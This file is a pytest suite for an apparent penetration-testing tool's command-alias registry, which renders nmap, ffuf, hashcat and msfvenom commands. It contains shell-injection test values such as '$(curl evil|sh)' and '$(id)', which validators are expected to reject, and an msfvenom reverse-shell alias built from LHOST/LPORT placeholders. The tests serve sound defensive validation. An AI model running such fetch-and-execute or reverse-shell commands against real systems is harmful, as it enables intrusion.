"""L1: the command-alias registry model, search and rendering."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from skuggi.engagement.workspace import WorkspaceLayout
from skuggi.tooling.commands import CommandAlias, CommandRegistry, raw_command, render
from skuggi.tooling.registry import ToolRegistry, ToolSpec
from tests.support import template

_REG = ToolRegistry(
    tools=(
        ToolSpec(
            name="nmap",
            binary="nmap",
            method="scan",
            output_flag="-oA",
            output_dir="recon/nmap",
            output_kind="prefix",
        ),
        ToolSpec(
            name="ffuf",
            binary="ffuf",
            method="enumerate",
            target_flags=("-u",),
            output_flag="-o",
            output_dir="recon/dirs",
            output_extra=("-of", "json"),
            output_kind="file",
            output_ext=".json",
        ),
        ToolSpec(
            name="hashcat",
            binary="hashcat",
            method="crack",
            requires_target=False,
            output_flag="-o",
            output_dir="loot",
            output_kind="file",
            output_ext=".txt",
        ),
        ToolSpec(name="whatweb", binary="whatweb", method="recon"),
    )
)


def test_resolve_appends_extra_args() -> None:
    alias = CommandAlias(name="nmap-host", argv=("nmap", "-sV", "-sC"))
    assert alias.resolve(["10.0.0.5"]) == ["nmap", "-sV", "-sC", "10.0.0.5"]


def test_tool_name_and_label_defaults() -> None:
    alias = CommandAlias(name="nmap-host", argv=("nmap", "-sV"))
    assert alias.tool_name() == "nmap"  # defaults to argv[0]
    assert alias.label_text() == "host"  # name sans the tool prefix
    explicit = CommandAlias(name="x", argv=("nmap",), tool="nmap", label="deep")
    assert explicit.tool_name() == "nmap"
    assert explicit.label_text() == "deep"


def test_search_matches_name_tool_and_description() -> None:
    reg = CommandRegistry(
        commands=(
            CommandAlias(name="nmap-host", argv=("nmap", "-sV"), description="scan"),
            CommandAlias(name="web-dir", argv=("ffuf", "-u"), description="fuzz dirs"),
        )
    )
    assert [a.name for a in reg.search("nmap")] == ["nmap-host"]  # by name
    assert [a.name for a in reg.search("ffuf")] == ["web-dir"]  # by tool (argv[0])
    assert [a.name for a in reg.search("fuzz")] == ["web-dir"]  # by description
    assert len(reg.search("")) == 2  # blank = all


def test_render_injects_target_and_output_flag() -> None:
    alias = CommandAlias(name="nmap-host", argv=("nmap", "-sV", "-sC"))
    rendered = render(alias, _REG)
    assert rendered == (
        "nmap -sV -sC ${target} -oA recon/nmap/$(date +%Y-%m-%d_%H%M%S)_${target}_host"
    )


def test_render_keeps_shell_expansions_unquoted() -> None:
    # The crux: shlex.join must NOT quote the date substitution or ${target},
    # or the operator's shell would write a literal filename instead of expanding.
    rendered = render(CommandAlias(name="ffuf-dir", argv=("ffuf", "-u")), _REG)
    assert "$(date +%Y-%m-%d_%H%M%S)" in rendered  # unquoted command substitution
    assert "${target}" in rendered  # unquoted shell variable
    assert "'$(date" not in rendered  # never quoted
    assert "-of json" in rendered  # the extra output-format flags
    assert rendered.endswith("_dir.json")  # file kind + extension


def test_render_without_target_for_non_target_tools() -> None:
    # hashcat does not take a network target, so no ${target} argument is added,
    # but the output flag still lands in the loot folder.
    rendered = render(CommandAlias(name="hashcat-ntlm", argv=("hashcat",)), _REG)
    assert "${target}" not in rendered.split("-o ")[0]  # no positional target arg
    assert rendered.startswith("hashcat -o loot/")


def test_render_output_false_suppresses_injection() -> None:
    alias = CommandAlias(name="nmap-ping", argv=("nmap", "-sn"), output=False)
    assert render(alias, _REG) == "nmap -sn ${target}"  # target, but no -oA


def test_render_unknown_tool_still_appends_target() -> None:
    # whatweb has no output convention; the command is just base + target.
    assert (
        render(CommandAlias(name="whatweb-scan", argv=("whatweb",)), _REG)
        == "whatweb ${target}"
    )


def test_alias_lookup_and_names() -> None:
    reg = CommandRegistry(
        commands=(
            CommandAlias(name="a", argv=("nmap", "-sn")),
            CommandAlias(name="b", argv=("curl",)),
        )
    )
    assert reg.names() == ("a", "b")
    assert reg.alias_for("a") is not None
    assert reg.alias_for("missing") is None


def test_raw_command_is_shell_quoted() -> None:
    assert raw_command(["nmap", "-sV", "10.0.0.5"]) == "nmap -sV 10.0.0.5"
    assert raw_command(["sh", "-c", "a b"]) == "sh -c 'a b'"


def test_example_registry_loads_with_the_shipped_aliases() -> None:
    example = template("commands.example.json")
    reg = CommandRegistry.model_validate_json(example.read_text(encoding="utf-8"))
    assert "nmap-network" in reg.names()
    host = reg.alias_for("nmap-host")
    assert host is not None
    assert host.argv == ("nmap", "-sV", "-sC")


def test_example_cheatsheet_is_consistent_with_tools_and_layout() -> None:
    """Every shipped alias renders, and every tool output_dir is a real folder.

    Ties the three templates together: an alias's tool must be a known binary,
    and each output folder must be one ``WorkspaceLayout`` creates -- otherwise a
    rendered command would point outside the engagement tree.
    """
    tools = ToolRegistry.model_validate_json(
        template("tools.example.json").read_text(encoding="utf-8")
    )
    commands = CommandRegistry.model_validate_json(
        template("commands.example.json").read_text(encoding="utf-8")
    )
    layout_dirs = set(WorkspaceLayout().dirs())
    for spec in tools.tools:
        if spec.output_dir is not None:
            assert spec.output_dir in layout_dirs, spec.binary
    for alias in commands.commands:
        rendered = render(alias, tools)  # must not raise
        assert rendered.startswith(alias.argv[0])
        # The alias's tool resolves (or is intentionally a bare binary).
        assert alias.tool_name()


# --- S4: cheatsheet fields are rendered UNQUOTED, so they must be validated --


def test_alias_label_rejects_shell_injection() -> None:
    with pytest.raises(ValidationError):
        CommandAlias(name="x", argv=("nmap",), label="$(curl evil|sh)")


def test_alias_output_dir_rejects_shell_injection() -> None:
    with pytest.raises(ValidationError):
        CommandAlias(name="x", argv=("nmap",), output_dir="recon/$(id)")


def test_tool_spec_output_dir_rejects_shell_injection() -> None:
    with pytest.raises(ValidationError):
        ToolSpec(name="x", binary="x", method="scan", output_dir="out/$(id)")


def test_render_still_emits_the_sanctioned_literals() -> None:
    """No over-block: $(date) and ${target} come from constants, not fields."""
    out = render(CommandAlias(name="nmap-host", argv=("nmap", "-sV")), _REG)
    assert "$(date" in out
    assert "${target}" in out


# --- runtime placeholders in argv survive rendering unquoted (lhost/lport/wordlist) --


def test_render_keeps_runtime_placeholders_in_argv_unquoted() -> None:
    # An operator-authored alias may reference the exported runtime vars; the
    # tokens must survive UNQUOTED so the shell expands them, including the
    # embedded forms ``LHOST=${lhost}`` and ``http://${target}/FUZZ``.
    alias = CommandAlias(
        name="rev-shell",
        argv=("msfvenom", "LHOST=${lhost}", "LPORT=${lport}", "-o", "shell"),
        output=False,
    )
    rendered = render(alias, _REG)
    assert "LHOST=${lhost}" in rendered
    assert "LPORT=${lport}" in rendered
    assert "'${" not in rendered  # never quoted


def test_render_keeps_wordlist_and_url_placeholders_unquoted() -> None:
    alias = CommandAlias(
        name="ffuf-fuzz",
        argv=("ffuf", "-w", "${wordlist}", "-u", "http://${target}/FUZZ"),
        output=False,
    )
    rendered = render(alias, _REG)
    assert "-w ${wordlist}" in rendered
    assert "http://${target}/FUZZ" in rendered
    assert "'$" not in rendered


def test_render_still_quotes_unsanctioned_dollar_tokens() -> None:
    # A non-placeholder ``$`` token (command substitution, env var, a word with a
    # space) is STILL shlex-quoted -- the raw path is only for sanctioned ${name}.
    alias = CommandAlias(
        name="danger",
        argv=("sh", "-c", "$(id)", "$HOME", "a b"),
        output=False,
    )
    rendered = render(alias, _REG)
    assert "'$(id)'" in rendered
    assert "'$HOME'" in rendered
    assert "'a b'" in rendered


def test_render_byte_identical_for_placeholder_free_argv() -> None:
    # The fast path (no ``$``) must match shlex.join exactly, token for token.
    argv = ("curl", "-sS", "--path-as-is", "-H", "X-Test: 1")
    alias = CommandAlias(name="curl-x", argv=argv, output=False)
    rendered = render(alias, _REG)
    assert rendered.split(" ${target}")[0] == raw_command(list(argv))
